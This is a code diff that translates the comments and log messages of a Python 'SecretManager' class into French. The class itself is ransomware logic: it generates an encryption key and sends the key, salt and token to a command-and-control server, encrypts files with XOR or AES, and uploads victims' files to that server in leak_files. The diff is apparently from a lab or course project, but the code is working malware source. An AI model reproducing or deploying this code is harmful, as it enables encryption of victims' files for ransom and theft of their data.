@@ -32,7 +32,7 @@ class SecretManager:
 
         self._log = logging.getLogger(self.__class__.__name__)
 
-    # Derive a key using PBKDF2HMAC
+    # Dérive une clé à l'aide de PBKDF2HMAC
     def do_derivation(self, salt: bytes, key: bytes) -> bytes:
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
@@ -43,7 +43,7 @@ class SecretManager:
         derived_key = kdf.derive(key)
         return derived_key
 
-    # Create cryptographic elements
+    # Crée les éléments cryptographiques
     def create(self) -> Tuple[bytes, bytes, bytes, int]:
         salt = secrets.token_bytes(self.SALT_LENGTH)
         key = secrets.token_bytes(self.TOKEN_LENGTH)
@@ -51,12 +51,12 @@ class SecretManager:
         timestamp = int(time.time()).to_bytes(4, byteorder="big")
         return salt, key, token, timestamp
 
-    # Convert binary data to base64 string
+    # Convertit les données binaires en chaîne base64
     def bin_to_b64(self, data: bytes) -> str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
-    # Send cryptographic elements to CNC
+    # Envoie les éléments cryptographiques au CNC
     def post_new(self, salt: bytes, key: bytes, token: bytes,timestamp: int) -> None:
         url = f"http://{self._remote_host_port}/new"
         data = {
@@ -73,7 +73,7 @@ class SecretManager:
             self._log.info("Data sent to CNC successfully")
 
     def setup(self) -> None:
-        # Check connection to CNC
+        # Vérifie la connexion au CNC
         try:
             url = f"http://{self._remote_host_port}/ping"
             response = requests.get(url)
@@ -82,26 +82,26 @@ class SecretManager:
         except ConnectionError as e:
             raise e
 
-        # Check if token and salt files exist
+        # Vérifie si les fichiers token et salt existent
         if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
             raise FileExistsError("A _token.bin file already exists. Cancelling setup.")
 
-        # Create cryptographic elements
+        # Crée les éléments cryptographiques
         self._salt, self._key, self._token,self.timestamp = self.create()
-        
-        # Create directory if needed
+
+        # Crée le répertoire si nécessaire
         os.makedirs(self._path, exist_ok=True)
-        # Save salt and token locally
+        # Sauvegarde localement le sel et le jeton
         with open(os.path.join(self._path, "_salt.bin"), "wb") as salt_file:
             salt_file.write(self._salt)
         with open(os.path.join(self._path, "_token.bin"), "wb") as token_file:
             token_file.write(self._token)
         with open(os.path.join(self._path, "_timestamp.bin"), "wb") as timestamp_file:
             timestamp_file.write(self.timestamp)
-        # Send cryptographic elements to CNC
+        # Envoie les éléments cryptographiques au CNC
         self.post_new(self._salt, self._key, self._token, self.timestamp)
 
-    # Load cryptographic data from local files
+    # Charge les données cryptographiques à partir des fichiers locaux
     def load(self) -> None:
         salt_path = os.path.join(self._path, "_salt.bin")
         token_path = os.path.join(self._path, "_token.bin")
@@ -113,16 +113,17 @@ class SecretManager:
                 self._token = token_file.read()
             with open(os.path.join(self._path, "_timestamp.bin"), "rb") as timestamp_file:
                 self.timestamp = timestamp_file.read()
-                
+
         else:
             self._log.warning("The _salt.bin/_token.bin or _timestamp.bin  files do not exist. Unable to load cryptographic data.")
 
-    # Check if the candidate key is valid
+
+    # Vérifie si la clé candidate est valide
     def check_key(self, candidate_key: bytes) -> bool:
         token = self.do_derivation(self._salt, candidate_key)
         return token == self._token
 
-    # Set the decryption key
+    # Définit la clé de déchiffrement
     def set_key(self, b64_key: str) -> None:
         candidate_key = base64.b64decode(b64_key)
 
@@ -131,39 +132,39 @@ class SecretManager:
         else:
             raise ValueError("The provided key is invalid.")
 
-    # Get the hexadecimal token
+    # Obtient le jeton hexadécimal
     def get_hex_token(self) -> str:
         token_hash = sha256(self._token).hexdigest()
         return token_hash
 
     def get_int_timestamp(self) -> int:
         return int.from_bytes(self.timestamp, byteorder="big")
-    
-    # XOR encrypt/decrypt files
+
+    # Chiffre/Déchiffre les fichiers avec XOR
     def xor_files(self, files: List[str]) -> None:
         for file_path in files:
             try:
                 xor_file(file_path, self._key)
             except Exception as e:
-                self._log.error(f"Error encrypting/decrypting file {file_path}: {e}")
+                self._log.error(f"Erreur lors du chiffrement/déchiffrement du fichier {file_path}: {e}")
 
-    # AES encrypt files
+    # Chiffre les fichiers avec AES
     def aes_files(self, files: List[str]) -> None:
         for file_path in files:
             try:
                 aes_encrypt_file(file_path, self._key)
             except Exception as e:
-                self._log.error(f"Error encrypting file {file_path}: {e}")
+                self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")
 
-    # AES decrypt files
+    # Déchiffre les fichiers avec AES
     def unaes_files(self, files: List[str]) -> None:
         for file_path in files:
             try:
                 aes_decrypt_file(file_path, self._key)
             except Exception as e:
-                self._log.error(f"Error decrypting file {file_path}: {e}")
+                self._log.error(f"Erreur lors du déchiffrement du fichier {file_path}: {e}")
 
-    # Send files to CNC
+    # Envoie les fichiers au CNC
     def leak_files(self, files: List[str]) -> None:
         for file_path in files:
             try:
@@ -186,15 +187,16 @@ class SecretManager:
                 response = requests.post(url, json=data, params={"token": self.get_hex_token()})
 
                 if response.status_code != 200:
-                    self._log.error(f"Failed to send file {file_path} to CNC: {response.text}")
+                    self._log.error(f"Échec de l'envoi du fichier {file_path} au CNC: {response.text}")
                 else:
-                    self._log.info(f"File {file_path} sent to CNC successfully")
+                    self._log.info(f"Fichier {file_path} envoyé au CNC avec succès")
             except Exception as e:
-                self._log.error(f"Error sending file {file_path} to CNC: {e}")
+                self._log.error(f"Erreur lors de l'envoi du fichier {file_path} au CNC: {e}")
 
-    # Clean up local cryptographic data and clear in-memory data
+
+    # Nettoie les données cryptographiques locales et efface les données en mémoire
     def clean(self) -> None:
-        # Remove local cryptographic data (salt.bin and token.bin)
+        # Supprime les données cryptographiques locales (_salt.bin et _token.bin)
         salt_path = os.path.join(self._path, "_salt.bin")
         token_path = os.path.join(self._path, "_token.bin")
 
@@ -215,7 +217,7 @@ class SecretManager:
         except Exception as e:
             self._log.error(f"Error while removing _token.bin file: {e}")
 
-        # Clear in-memory data
+        # Netttoie les données en mémoire
         self._salt = None
         self._token = None
         self._key = None
